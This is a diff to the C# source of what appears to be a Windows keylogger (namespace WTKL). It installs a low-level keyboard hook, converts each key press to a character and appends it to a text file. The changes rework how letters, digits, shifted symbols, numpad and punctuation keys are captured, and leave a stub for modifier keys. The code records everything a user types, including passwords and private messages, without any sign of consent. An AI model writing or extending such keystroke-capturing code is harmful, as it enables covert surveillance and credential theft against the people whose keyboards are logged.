@@ -55,6 +55,7 @@ namespace WTKL
         private const byte VK_RIGHT_MENU = 165;
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+        private const int WM_KEYUP = 0x0101;
 
         private const string CTRL_STR = "CTRL";
         private const string ALT_STR = "ALT";
@@ -286,15 +287,10 @@ namespace WTKL
         private static IntPtr HookCallback(int nCode, IntPtr wParam, ref keyboardHookStruct lParam)
         {
             string output = "";
-            bool firstKey = true;
-            byte[] keyboardArray = new byte[256];
-
 
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                //KeyStateHelper();
-                //vk = 110 for numpad period
-                //vk = 190 for regular period
+                byte[] keyboardArray = new byte[256];
                 GetKeyState(0);
                 GetKeyboardState(keyboardArray);
 
@@ -305,14 +301,14 @@ namespace WTKL
                 keyboardArray[VK_CONTROL] = (byte)(keyboardArray[VK_CONTROL] | keyboardArray[VK_LEFT_CONTROL] |
                     keyboardArray[VK_RIGHT_CONTROL]);
 
-                for (int i = 0; i < keyboardArray.Length; i++)
+                /*for (int i = 0; i < keyboardArray.Length; i++)
                 {
                     if ((keyboardArray[i] & 0x80) != 0)
                     {
                         /*if (lParam.vkCode == i)
                         {
                             output = output + " + " + keyStrings[i];
-                        }*/
+                        }*//*
                         if (firstKey)
                         {
                             output += keyStrings[i];
@@ -335,7 +331,7 @@ namespace WTKL
                             output += " + " + keyStrings[i];
                         }
                     }
-                }
+                }*/
 
                 //If keycode is between a and z
                 if (lParam.vkCode >= 65 && lParam.vkCode <= 90)
@@ -357,7 +353,7 @@ namespace WTKL
                 }
 
                 //If keycode is between numpad 0 and numpad 9
-                if (lParam.vkCode >= 96 && lParam.vkCode <= 105)
+                else if (lParam.vkCode >= 96 && lParam.vkCode <= 105)
                 {
                     if ((keyboardArray[VK_NUMLOCK] & 0x01) != 0)
                     {
@@ -372,57 +368,58 @@ namespace WTKL
                 }
 
                 //If keycode is a regular keyboard number
-                if (lParam.vkCode >= 48 && lParam.vkCode <= 57)
+                else if (lParam.vkCode >= 48 && lParam.vkCode <= 57)
                 {
                     if ((keyboardArray[VK_SHIFT] & 0x80) != 0)
                     {
                         switch (lParam.vkCode)
                         {
                             case 48: //0 key
-                                output += ")";
+                                output = ")";
                                 break;
                             case 49: //1 key
-                                output += "!";
+                                output = "!";
                                 break;
                             case 50: //2 key
-                                output += "@";
+                                output = "@";
                                 break;
                             case 51: //3 key
-                                output += "#";
+                                output = "#";
                                 break;
                             case 52: //4 key
-                                output += "$";
+                                output = "$";
                                 break;
                             case 53: //5 key
-                                output += "%";
+                                output = "%";
                                 break;
                             case 54: //6 key
-                                output += "^";
+                                output = "^";
                                 break;
                             case 55: //7 key
-                                output += "&";
+                                output = "&";
                                 break;
                             case 56: //8 key
-                                output += "*";
+                                output = "*";
                                 break;
                             case 57: //9 key
-                                output += "(";
+                                output = "(";
                                 break;
                         }
                     }
+
                     else
                     {
                         byte[] asciiConvertBuffer = new byte[2];
                         if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
                         {
                             char key = (char)asciiConvertBuffer[0];
-                            output += key.ToString();
+                            output = key.ToString();
                         }
                     }
                 }
 
                 //Capture "OEM" and arithmetic keyboard keys
-                if ((lParam.vkCode >= 186 && lParam.vkCode <= 191) ||
+                else if ((lParam.vkCode >= 186 && lParam.vkCode <= 191) ||
                     (lParam.vkCode >= 219 && lParam.vkCode <= 223) ||
                     (lParam.vkCode >= 106 && lParam.vkCode <= 111) ||
                     (lParam.vkCode == 192))
@@ -431,85 +428,26 @@ namespace WTKL
                     if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
                     {
                         char key = (char)asciiConvertBuffer[0];
-                        output += key.ToString();
-                    }
-                }
-
-                
-
-                /*for (int i = 0; i < keyStates.Length; i++)
-                {
-                    if (keyStates[i] == 0x01)
-                    {
-                        if (!firstKey)
-                        {
-                            output = output + " + ";
-                        }
-                        else
-                        {
-                            output = output + keyStrings[i];
-                        }
-                        if (firstKey)
-                        {
-                            firstKey = false;
-                        }
-                    }
-                }
-                if (output == SHIFT_STR)
-                {
-                    output = "";
-                    firstKey = true;
-                }*/
-
-                //byte[] asciiConvertBuffer = new byte[2];
-                //byte[] keyboardArray = new byte[256];
-                //If letter or number
-                /*if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
-                {
-                    char key = (char)asciiConvertBuffer[0];
-                    if ((GetKeyState(VK_CONTROL) & 0x8000) == 0)
-                    {
-                        if (((GetKeyState(VK_SHIFT) & 0x8000) != 0 ^ (GetKeyState(VK_CAPS) & 0x0001) != 0)
-                            && Char.IsLetter(key))
-                        {
-                            //If shift XOR caps lock then capitalize here
-                            key = Char.ToUpper(key);
-                        }
-                        else
-                        {
-                            if (Char.IsLetter(key))
-                            {
-                                key = Char.ToLower(key);
-                            }
-                        }
-
-                    }
-                    if (!firstKey)
-                    {
-                        output = output + key;
-                    }
-                    else
-                    {
                         output = key.ToString();
                     }
-                }*/
-
-                if (output.Length > 1)
-                {
-                    output = "[" + output + "]";
                 }
+
+                else if (lParam.vkCode == VK_SPACE)
+                {
+                    output = " ";
+                }
+
+                else if (true) //todo modifier keys
+                {
+
+                }
+
                 textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
                 textFileWriter.Write(output);
                 textFileWriter.Close();
-
-                //int vkCode = Marshal.ReadInt32(lParam);
-                //char key = (char)vkCode;
-
-                //int vkCode = Marshal.ReadInt32(lParam);
-                //textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
-                //textFileWriter.Write((Keys)vkCode);
-                //textFileWriter.Write(key);
-                //textFileWriter.Close();
+            }
+            else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
+            {
             }
             return CallNextHookEx(_hookID, nCode, wParam, ref lParam);
         }
